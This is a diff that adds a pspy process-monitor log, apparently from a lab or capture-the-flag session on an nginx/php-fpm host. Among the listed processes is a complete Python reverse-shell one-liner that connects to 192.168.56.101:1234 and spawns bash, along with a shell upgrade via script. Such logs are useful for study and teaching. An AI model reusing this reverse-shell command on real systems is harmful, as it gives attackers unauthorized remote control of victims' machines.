@@ -1,0 +1,37 @@
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2020/10/03 13:32:55 CMD: UID=0    PID=9      | tail -f /var/log/nginx/access.log /var/log/nginx/error.log 
+2020/10/03 13:32:55 CMD: UID=0    PID=8      | php-fpm: master process (/usr/local/etc/php-fpm.conf) 
+2020/10/03 13:32:55 CMD: UID=33   PID=50     | bash 
+2020/10/03 13:32:55 CMD: UID=33   PID=49     | sh -c bash 
+2020/10/03 13:32:55 CMD: UID=33   PID=48     | script /dev/null -c bash 
+2020/10/03 13:32:55 CMD: UID=33   PID=453    | ./pspy64 -pf -i 1000 
+2020/10/03 13:32:55 CMD: UID=33   PID=45     | /bin/bash 
+2020/10/03 13:32:55 CMD: UID=33   PID=44     | /usr/bin/python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash") 
+2020/10/03 13:32:55 CMD: UID=33   PID=43     | sh -c /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
+2020/10/03 13:32:55 CMD: UID=33   PID=28     | php-fpm: pool www 
+2020/10/03 13:32:55 CMD: UID=33   PID=25     | php-fpm: pool www 
+2020/10/03 13:32:55 CMD: UID=33   PID=24     | php-fpm: pool www 
+2020/10/03 13:32:55 CMD: UID=33   PID=23     | php-fpm: pool www 
+2020/10/03 13:32:55 CMD: UID=33   PID=22     | php-fpm: pool www 
+2020/10/03 13:32:55 CMD: UID=33   PID=19     | nginx: worker process 
+2020/10/03 13:32:55 CMD: UID=33   PID=18     | nginx: worker process 
+2020/10/03 13:32:55 CMD: UID=33   PID=17     | nginx: worker process 
+2020/10/03 13:32:55 CMD: UID=33   PID=16     | nginx: worker process 
+2020/10/03 13:32:55 CMD: UID=0    PID=15     | nginx: master process nginx 
+2020/10/03 13:32:55 CMD: UID=0    PID=1      | bash entrypoint
